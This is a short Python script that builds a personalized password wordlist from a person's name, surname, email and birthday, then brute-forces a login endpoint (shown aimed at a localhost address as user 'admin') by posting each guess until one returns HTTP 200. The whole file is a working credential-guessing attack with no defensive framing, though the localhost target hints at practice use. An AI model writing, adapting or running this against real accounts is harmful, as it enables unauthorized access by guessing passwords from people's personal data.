import requests


def generator(name, surname, email, birthday):
    global b_year, b_day, b_month
    if '@' in email:
        email = email.split("@")[0]
    if '.' in birthday:
        b_day = birthday.split('.')[0]
        b_month = birthday.split('.')[1]
        b_year = birthday.split('.')[2]
    # Fill data array
    data = [name, surname, email, b_year, b_day, b_month, b_year[2:4]]
    # Generate the most available passwords
    passwords = data
    for i in range(len(data)):
        for j in range(len(data)):
            passwords.append(data[i] + data[j])
            passwords.append((data[i] + data[j]).upper())
            passwords.append(data[i].capitalize() + data[j].capitalize())
            passwords.append(data[i].upper() + data[j])
            passwords.append(data[i] + data[j].upper())
            passwords.append(data[i] + data[j].capitalize())
            passwords.append(data[i].lower() + data[j].lower())
    return passwords


def brut_force(url, login, passwords):
    for i in range(len(passwords)):
        print('try ' + passwords[i])
        response = requests.post(url, json={'login': login,
                                            'password': passwords[i]})
        if response.status_code == 200:
            print('Hacked: ' + passwords[i])
            break


passwords = generator("ivan", "ivanov", "ivanovvr@ya.ru", "02.02.1985")
brut_force('http://127.0.0.1:5000/auth', 'admin', passwords)
